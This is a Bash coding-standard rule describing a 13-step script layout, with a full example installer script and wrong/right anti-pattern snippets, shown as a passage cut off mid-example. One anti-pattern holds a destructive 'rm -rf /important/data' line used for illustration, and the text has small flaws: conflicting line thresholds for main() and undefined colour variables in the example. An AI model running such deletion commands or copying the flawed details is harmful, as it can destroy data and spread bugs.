**Rule: BCS0101**

### General Layouts for Standard Script

**All Bash scripts should ideally follow a specific 13-step structural layout that ensures consistency, maintainability, and correctness. This bottom-up organizational pattern places low-level utilities before high-level orchestration, allowing each component to safely call previously defined functions. The structure is mandatory for all scripts and ensures that error handling, metadata, dependencies, and execution flow are properly established before any business logic runs.**

---

## Rationale

**Why enforce a strict 13-step layout?**

1. **Predictability** - Developers (and AI assistants) know exactly where to find specific components in any script. Metadata is always in step 6, utilities in step 9, business logic in step 10, orchestration in step 11.

2. **Safe Initialization** - The ordering ensures that critical infrastructure is established before it's needed: error handling (`set -euo pipefail`) is configured before any commands run, metadata is available before any function executes, and global variables are declared before any code references them.

3. **Bottom-Up Dependency Resolution** - Lower-level components are defined before higher-level ones that depend on them. Messaging functions come before business logic that calls them, business logic comes before `main()` that orchestrates it. Each function can safely call any function defined above it.

4. **Testing and Maintenance** - Consistent structure makes scripts easier to test, debug, and maintain. You can source a script to test individual functions, extract utilities for reuse, or understand unfamiliar code quickly because the structure is standardized.

5. **Error Prevention** - The strict ordering prevents entire classes of errors: using undefined functions, referencing uninitialized variables, or running business logic before error handling is configured. Many subtle bugs are prevented by structure alone.

6. **Documentation Through Structure** - The layout itself documents the script's organization. The progression from infrastructure (steps 1-8) through implementation (steps 9-10) to orchestration (steps 11-12) tells the story of how the script works.

7. **Production Readiness** - The structure includes all elements needed for production scripts: version tracking, proper error handling, terminal detection for output, argument validation, and clear execution flow. Nothing is left to chance.

---

## The 13 Mandatory Steps

### Step 1: Shebang

**First line of every script - specifies the interpreter.**

```bash
#!/bin/bash
```

**Alternatives:**
```bash
#!/usr/bin/bash
```

```bash
#!/usr/bin/env bash
```

Within a module+script program -- one that can be either sourced or executed -- the shebang can be used again to semantically indicate the beginning of the executable part of the file.

**Rationale for `env` approach:**
- Portable across systems where bash may be in different locations
- Respects user's PATH settings
- Standard on modern systems

### Step 2: ShellCheck Directives (if needed)

**Global directives that apply to the entire script.**

```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
#shellcheck disable=SC1091  # Don't follow sourced files
```

**Always include explanatory comments** for disabled checks.

Only use when necessary - don't disable checks without good reason.

### Step 3: Brief Description Comment

**One-line purpose statement immediately after shebang/directives.**

```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

**Not a full header block** - just a concise description.

### Step 4: `set -euo pipefail`

**Mandatory strict error handling configuration.**

```bash
set -euo pipefail
```

**What this enables:**
- `set -e` - Exit on any command failure
- `set -u` - Exit on undefined variable reference
- `set -o pipefail` - Pipelines fail if any command fails (not just the last)

**This MUST come before any commands** (except shebang/comments/shellcheck).

**Optional Bash >= 5 test**

If a Bash version check is *really* necessary, insert it immediately after `set -euo pipefail`:

```bash
#!/bin/bash
#shellcheck disable=1090
# Backup program for sql databases
set -euo pipefail
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; } # check bash version >= 5

```

Always assume you are working in a Bash 5 environment.

### Step 5: `shopt` Settings

**Strongly recommended shell option settings.**
```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```

    shopt -s inherit_errexit  # Subshells inherit set -e
    shopt -s shift_verbose    # Warn on shift with no arguments
    shopt -s extglob          # Enable extended pattern matching
    shopt -s nullglob         # Empty globs expand to nothing (not literal string)


**Why these specific options:**
- `inherit_errexit` - Prevents subshells from silently continuing after errors
- `shift_verbose` - Catches argument parsing bugs
- `extglob` - Enables powerful pattern matching: `@(pattern)`, `!(pattern)`, etc.
- `nullglob` - Makes empty globs safe (critical for `for file in *.txt` patterns)

### Step 6: Script Metadata

**Standard metadata variables - make readonly together after declaration.**

```bash
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
```

**Why these specific variables:**
- `VERSION` - For `--version` flag, logging, compatibility checks
- `SCRIPT_PATH` - Absolute canonical path to script (resolves symlinks)
- `SCRIPT_DIR` - Directory containing script (for relative file access)
- `SCRIPT_NAME` - Script basename (for messages, logging, temp files)

**Why readonly together:** More efficient than individual readonly statements, documents that these are immutable constants.

**Acceptable alternative forms**
```bash
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

```bash
# parent program location locking, for a specific application with unique namespace
[[ -v ALX_VERSION ]] || {
  declare -xr ALX_VERSION='1.0.0'
  #shellcheck disable=SC2155
  declare -xr ALX_PATH=$(realpath -- "${BASH_SOURCE[0]}")
  declare -xr ALX_DIR=${ALX_PATH%/*} ALX_NAME=${ALX_PATH##*/}
}
```

Note:
  - `shellcheck` SC2155 warnings (declare and assign separately...), can be safely ignored when using `realpath` or `readlink`. (If you've got problems with `realpath`, then you have much greater problems elsewhere.)
  - On some BCS compliant systems `realpath` is set up as a builtin, which is 10x faster than using an executable.

### Step 7: Global Variable Declarations

**All global variables declared up front with types.**

```bash
# Configuration variables
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

# Runtime state
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0

# Arrays for accumulation
declare -a INPUT_FILES=()
declare -a WARNINGS=()
```

**Type declarations:**

Always:

- `declare -i` for integers (enables arithmetic context)
- `declare --` for strings (explicit string type)
- `declare -a` for indexed arrays
- `declare -A` for associative arrays

**Why up front:** Makes all globals visible in one place, prevents accidental creation of globals in functions, documents script's state.

### Step 8: Color Definitions (if terminal output)

**Terminal detection and color code definitions.**

Preferred:

```bash
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

OR:

```bash
if [[ -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi
```

Acceptable:

```bash
# Detect terminal capabilities
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1; then
  RED=$(tput setaf 1)
  GREEN=$(tput setaf 2)
  YELLOW=$(tput setaf 3)
  BLUE=$(tput setaf 4)
  BOLD=$(tput bold)
  RESET=$(tput sgr0)
  readonly -- RED GREEN YELLOW BLUE BOLD RESET
else
  # Not a terminal or tput unavailable - no colors
  declare -r RED='' GREEN='' YELLOW='' BLUE='' BOLD='' RESET=''
fi
```

**Why conditional:** Colors only work on terminals - don't use them when output is piped or redirected.

**Skip this step** if your script doesn't use colored output.

### Step 9: Utility Functions

**Messaging and helper functions - lowest level, used by everything else.**

Users should comment out or remove elements that are not required.

```bash
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

# _Core messaging function using FUNCNAME
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

# Verbose output (respects VERBOSE flag)
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
# Info messages
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Warnings (non-fatal)
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
# Debug output (respects DEBUG flag)
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
# Success messages
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
# Error output (unconditional)
error() { >&2 _msg "$@"; }
# Exit with error
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- reply
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-} y/n ")" reply
  >&2 echo
  [[ ${reply,,} == y ]]
}
```

For very simple programs with no need for color or verbosity control, user may simplify the standard messaging functions like this:

```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
debug() { >&2 echo "${FUNCNAME[0]}: $*"; }
success() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
```

User is strongly encouraged to use these function names for logging output, for both consistency, and for when that quick-and-dirty test script of yours evolves into a Magnum Opus, and now you need proper coloured and verbosity controlled message functions, like you should have used straight from the beginning. You're welcome.

**Why these come first:** Business logic needs messaging, validation, and error handling. These utilities must exist before anything calls them.

**Production optimization:** Remove unused functions after script is mature (see Section 6 of main standard).

### Step 10: Business Logic Functions

**Core functionality - the actual work of the script.**

```bash
# Check if all required commands are available
check_prerequisites() {
  # This function requires message functions error(), die(), and success()
  local -i missing=0
  local -- cmd

  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found '$cmd'"
      missing+=1
    fi
  done

  ((missing==0)) || die 1 "Missing $missing required commands"
  success 'All prerequisites satisfied'
}

# Validate configuration
validate_config() {
  # This function requires global var PREFIX, and message functions die() and success()
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist '$PREFIX'"

  success 'Configuration validated'
}

# Install files to target directory
install_files() {
  # This function requires global var DRY_RUN, and message functions info() and success()
  local -- source_dir=$1
  local -- target_dir=$2

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install files from '$source_dir' to '$target_dir'"
    return 0
  fi

  [[ -d "$source_dir" ]] || die 2 "Source directory not found '$source_dir'"
  mkdir -p "$target_dir" || die 1 "Failed to create target directory '$target_dir'"

  cp -r "$source_dir"/* "$target_dir"/ || die 1 'Installation failed'
  success "Installed files to '$target_dir'"
}

# Generate configuration file
generate_config() {
  # This function requires global vars DRY_RUN, PREFIX, and VERSION; and message functions info() and success()
  local -- config_file=$1

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config '$config_file'"
    return 0
  }

  cat > "$config_file" <<EOF
# Generated configuration
PREFIX=$PREFIX
VERSION=$VERSION
INSTALL_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
EOF

  success "Generated config '$config_file'"
}
```

**Organize bottom-up within business logic:**
- Lower-level functions first (validation, file operations)
- Higher-level functions later (orchestration)
- Each function can call functions defined above it

### Step 11: `main()` Function and Options/Argument Parsing

**Required for scripts over ~200 lines - orchestrates everything.**

```bash
main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift
                     PREFIX="$1" ;;

      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--force)    FORCE=1 ;;

      -V|--version)  echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
      -h|--help)     usage; exit 0 ;;

      -[pvqnfVh]*) #shellcheck disable=SC2046 #split up single options
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option: $1" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done

  # Make configuration readonly after parsing
  readonly -- PREFIX CONFIG_FILE LOG_FILE
  readonly -i VERBOSE DRY_RUN FORCE

  # Execute workflow
  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled'

  check_prerequisites
  validate_config
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share
  generate_config "$PREFIX"/etc/myapp.conf

  success 'Installation complete'
}
```

**Why main() is required:**
- **Testing** - Can source script and test `main()` with specific arguments
- **Organization** - Single entry point makes execution flow clear
- **Scoping** - Argument parsing can use local variables in main()
- **Debugging** - Easy to add debug hooks before/after main()

**Exception:** Scripts under 100 lines can skip `main()` and run directly.

### Step 12: Script Invocation

**Execute main with all arguments.**

```bash
main "$@"
```

**ALWAYS quote `"$@"`** to preserve argument array properly.

**For small scripts without main():** Just write business logic directly here.

### Step 13: End Marker

**Mandatory final line.**

```bash
#fin
```

OR:

```bash
#end
```

**Why mandatory:**
- Visual confirmation script is complete (not truncated)
- Some editors/tools look for end-of-file marker
- Consistency across all scripts

---

## Complete Example: All 13 Steps

This example demonstrates every step of the mandatory structure in a realistic installation script:

```bash
#!/bin/bash
#shellcheck disable=SC2034  # Some variables used by sourcing scripts
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata
# ============================================================================

VERSION='2.1.420'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variable Declarations
# ============================================================================

# Configuration (can be modified by arguments)
declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'
declare -- SYSTEM_USER='myapp'

# Derived paths (updated when PREFIX changes)
declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- CONFIG_DIR="/etc/$APP_NAME"
declare -- LOG_DIR="/var/log/$APP_NAME"

# Runtime flags
declare -i DRY_RUN=0
declare -i FORCE=0
declare -i INSTALL_SYSTEMD=0

# Accumulation arrays
declare -a WARNINGS=()
declare -a INSTALLED_FILES=()

# ============================================================================
# Step 8: Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD='\033[1m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# ============================================================================
# Step 9: Utility Functions
# Requires Color Definitions, and globals VERBOSE DEBUG PROMPT SCRIPT_NAME
# Upon script maturity, remove those functions not actually required by script.
# ============================================================================
declare -i VERBOSE=1
#declare -i DEBUG=0 PROMPT=1

_msg() {
  local -- status="${FUNCNAME[1]}" prefix="$SCRIPT_NAME:" msg
  case "$status" in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}⚡${NC}" ;;
#    debug)   prefix+=" ${CYAN}DEBUG${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
#debug() { ((DEBUG)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
# Yes/no prompt
yn() {
  #((PROMPT)) || return 0
  local -- reply
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-} y/n ")" reply
  >&2 echo
  [[ ${reply,,} == y ]]
}

noarg() {
  (($# > 1)) || die 22 "Option '$1' requires an argument"
}

# ============================================================================
# Step 10: Business Logic Functions
# ============================================================================

# Update derived paths when PREFIX or APP_NAME changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share

  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

usage() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS]

Configurable installation script with dry-run mode.

OPTIONS:
  -p, --prefix DIR       Installation prefix (default: /usr/local)
  -u, --user USER        System user for service (default: myapp)
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Overwrite existing files
  -s, --systemd          Install systemd service unit
  -v, --verbose          Enable verbose output
  -h, --help             Display this help message
  -V, --version          Display version information

EXAMPLES:
  # Dry-run installation to /opt
  $SCRIPT_NAME --prefix /opt --dry-run

  # Install with systemd service
  $SCRIPT_NAME --systemd --user webapp

  # Force reinstall to default location
  $SCRIPT_NAME --force

EOF
}

check_prerequisites() {
  local -i missing=0
  local -- cmd

  for cmd in install mkdir chmod chown; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found '$cmd'"
      missing=1
    fi
  done

  if ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1; then
    error 'systemd installation requested but systemctl not found'
    missing=1
  fi

  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  # Validate PREFIX
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && die 22 'PREFIX cannot contain spaces'

  # Validate APP_NAME
  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || \
    die 22 'Invalid APP_NAME: must start with letter, contain only lowercase, digits, dash, underscore'

  # Validate SYSTEM_USER
  [[ -n "$SYSTEM_USER" ]] || die 22 'SYSTEM_USER cannot be empty'

  # Check write permissions
  if [[ ! -d "$PREFIX" ]]; then
    if ((FORCE)) || yn "Create PREFIX directory '$PREFIX'?"; then
      vecho "Will create '$PREFIX'"
    else
      die 1 'Installation cancelled'
    fi
  fi

  success 'Configuration validated'
}

create_directories() {
  local -- dir

  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory '$dir'"
      continue
    fi

    if [[ -d "$dir" ]]; then
      vecho "Directory exists '$dir'"
    else
      mkdir -p "$dir" || die 1 "Failed to create directory '$dir'"
      success "Created directory '$dir'"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR/bin"
  local -- target="$BIN_DIR"

  [[ -d "$source" ]] || die 2 "Source directory not found '$source'"

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install binaries from '$source' to '$target'"
    return 0
  }

  local -- file
  local -i count=0

  for file in "$source"/*; do
    [[ -f "$file" ]] || continue

    local -- basename=${file##*/}
    local -- target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists (use --force to overwrite) '$target_file'"
      continue
    fi

    install -m 755 "$file" "$target_file" || die 1 "Failed to install '$basename'"
    INSTALLED_FILES+=("$target_file")
    count+=1
    vecho "Installed '$target_file'"
  done

  success "Installed $count binaries to '$target'"
}

install_libraries() {
  local -- source="$SCRIPT_DIR/lib"
  local -- target="$LIB_DIR/$APP_NAME"

  [[ -d "$source" ]] || {
    vecho 'No libraries to install'
    return 0
  }

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install libraries from '$source' to '$target'"
    return 0
  }

  mkdir -p "$target" || die 1 "Failed to create library directory '$target'"

  cp -r "$source"/* "$target"/ || die 1 'Library installation failed'
  chmod -R a+rX "$target"

  success "Installed libraries to '$target'"
}

generate_config() {
  local -- config_file="$CONFIG_DIR"/"$APP_NAME".conf

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would generate config '$config_file'"
    return 0
  }

  if [[ -f "$config_file" ]] && ! ((FORCE)); then
    warn "Config file exists (use --force to overwrite) '$config_file'"
    return 0
  fi

  cat > "$config_file" <<EOT
# $APP_NAME configuration
# Generated by $SCRIPT_NAME v$VERSION on $(date -u +%Y-%m-%d)

[installation]
prefix = $PREFIX
version = $VERSION
install_date = $(date -u +%Y-%m-%dT%H:%M:%SZ)

[paths]
bin_dir = $BIN_DIR
lib_dir = $LIB_DIR
config_dir = $CONFIG_DIR
log_dir = $LOG_DIR

[runtime]
user = $SYSTEM_USER
log_level = INFO
EOT

  chmod 644 "$config_file"
  success "Generated config '$config_file'"
}

install_systemd_unit() {
  ((INSTALL_SYSTEMD)) || return 0

  local -- unit_file="/etc/systemd/system/${APP_NAME}.service"

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install systemd unit '$unit_file'"
    return 0
  fi

  cat > "$unit_file" <<EOT
[Unit]
Description=$APP_NAME Service
After=network.target

[Service]
Type=simple
User=$SYSTEM_USER
ExecStart=$BIN_DIR/$APP_NAME
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
EOT

  chmod 644 "$unit_file"
  systemctl daemon-reload || warn 'Failed to reload systemd daemon'

  success "Installed systemd unit '$unit_file'"
}

set_permissions() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would set directory permissions'
    return 0
  fi

  # Log directory should be writable by system user
  if id "$SYSTEM_USER" >/dev/null 2>&1; then
    chown -R "$SYSTEM_USER:$SYSTEM_USER" "$LOG_DIR" 2>/dev/null || \
      warn "Failed to set ownership on '$LOG_DIR' (may need sudo)"
  else
    warn "System user '$SYSTEM_USER' does not exist - skipping ownership changes"
  fi

  success 'Permissions configured'
}

show_summary() {
  cat <<EOT

${BOLD}Installation Summary${RESET}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Application:    $APP_NAME
  Version:        $VERSION
  Prefix:         $PREFIX
  System User:    $SYSTEM_USER

  Directories:
    Binaries:     $BIN_DIR
    Libraries:    $LIB_DIR
    Config:       $CONFIG_DIR
    Logs:         $LOG_DIR

  Files Installed: ${#INSTALLED_FILES[@]}
  Warnings:        ${#WARNINGS[@]}

EOT

  if ((${#WARNINGS[@]})); then
    echo "${YELLOW}Warnings:${RESET}"
    local -- warning
    for warning in "${WARNINGS[@]}"; do
      echo "  • $warning"
    done
    echo
  fi

  if ((DRY_RUN)); then
    echo "${BLUE}This was a DRY-RUN - no changes were made${RESET}"
  fi
}

# ============================================================================
# Step 11: main() Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -p|--prefix)       noarg "$@"
                         shift
                         PREFIX="$1"
                         update_derived_paths
                         ;;

      -u|--user)         noarg "$@"
                         shift
                         SYSTEM_USER="$1"
                         ;;

      -n|--dry-run)      DRY_RUN=1 ;;
      -f|--force)        FORCE=1 ;;
      -s|--systemd)      INSTALL_SYSTEMD=1 ;;
      -v|--verbose)      VERBOSE=1 ;;

      -h|--help)         usage
                         exit 0
                         ;;

      -V|--version)      echo "$SCRIPT_NAME $VERSION"
                         exit 0
                         ;;

      -*)                die 22 "Invalid option '$1' (use --help for usage)" ;;
      *)                 die 2  "Unexpected argument '$1'" ;;
    esac
    shift
  done

  # Make configuration readonly after argument parsing
  readonly -- PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  # Show mode information
  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled - no changes will be made'
  ((VERBOSE==0)) || info 'Verbose mode enabled'
  ((FORCE==0))   || info 'Force mode enabled - will overwrite existing files'

  # Execute installation workflow
  info "Installing $APP_NAME v$VERSION to '$PREFIX'"

  check_prerequisites
  validate_config
  create_directories
  install_binaries
  install_libraries
  generate_config
  install_systemd_unit
  set_permissions

  show_summary

  if ((DRY_RUN)); then
    info 'Dry-run complete - review output and run without --dry-run to install'
  else
    success "Installation of $APP_NAME v$VERSION complete!"
  fi
}

# ============================================================================
# Step 12: Script Invocation
# ============================================================================

main "$@"

# ============================================================================
# Step 13: End Marker
# ============================================================================

#fin
```

---

## Anti-Patterns

### ✗ Wrong: Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION='1.0.0'

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors are not caught, script continues executing after failures, leading to silent corruption or incomplete operations.

### ✓ Correct: Error Handling First

```bash
#!/usr/bin/env bash

# Installation script with proper safeguards

set -euo pipefail

shopt -s inherit_errexit shift_verbose

VERSION='1.0.0'
# ... rest of script
```

---

### ✗ Wrong: Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  # Using VERBOSE before it's declared
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

# Variables declared after main()
declare -i VERBOSE=0

main "$@"
#fin
```

**Problem:** Variables are referenced before they're declared, leading to "unbound variable" errors with `set -u`.

### ✓ Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

# Declare all globals up front
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Now safe to use
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

# Business logic defined first
process_files() {
  local -- file
  for file in *.txt; do
    # Calling die() which isn't defined yet!
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

# Utilities defined after business logic
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

main() {
  process_files
  : ...
}

main "$@"
#fin
```

**Problem:** `process_files()` calls `die()` which isn't defined yet. This works in bash (functions are resolved at runtime) but violates the principle of bottom-up organization and makes code harder to understand.

### ✓ Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

# Utilities first
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Business logic can safely call utilities
process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

main() {
  process_files
}

main "$@"
#fin
```

---

### ✗ Wrong: No `main()` Function in Large Script

`set -euo pipefail` must be placed before the start of the first line of executing code.

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

# Argument parsing scattered throughout
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

# Business logic runs directly
check_prerequisites
validate_config
install_files

echo 'Done'
#fin
```

**Problem:** No clear entry point, argument parsing is scattered, can't easily test the script, can't source it to test individual functions.

### ✓ Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

main() {
  # Centralized argument parsing
  while (($#)); do
    case $1 in
      -h|--help) usage; exit 0 ;;
      *) die 22 "Invalid argument '$1'" ;;
    esac
    shift
  done

  # Clear execution flow
  check_prerequisites
  validate_config
  install_files

  success 'Installation complete'
}

main "$@"
#fin
```

---

### ✗ Wrong: Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

main() {
  echo 'Hello, World!'
}

main "$@"
# File ends without #fin or #end
```

**Problem:** No visual confirmation that file is complete, harder to detect truncated files.

### ✓ Correct: Always End With `#fin`

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

main() {
  echo 'Hello, World!'
}

main "$@"
#fin
```

---

### ✗ Wrong: Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
PREFIX='/usr/local'

# Made readonly too early!
readonly -- VERSION PREFIX

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        # This will fail - PREFIX is readonly!
        PREFIX="$1"
        ;;
    esac
    shift
  done
}

main "$@"
#fin
```

**Problem:** Variables that need to be modified during argument parsing are made readonly too early.

### ✓ Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

declare -- PREFIX='/usr/local'  # Will be modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        PREFIX="$1"  # OK - not readonly yet
        ;;
    esac
    shift
  done

  # Now make readonly after parsing complete
  readonly -- PREFIX

  # Rest of logic...
}

main "$@"
#fin
```

---

### ✗ Wrong: Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# Some globals
declare -i VERBOSE=0

# Function in the middle
check_something() {
  echo 'Checking...'
}

# More globals after function
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

main() {
  check_something
}

main "$@"
#fin
```

**Problem:** Globals are scattered throughout the file, making it hard to see all state variables at once.

### ✓ Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# All globals in one place
declare -i VERBOSE=0
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

# All functions after globals
check_something() {
  echo 'Checking...'
}

main() {
  check_something
}

main "$@"
#fin
```

---

### ✗ Wrong: Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
# This file is meant to be sourced, but...

set -euo pipefail  # Modifies caller's shell!

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

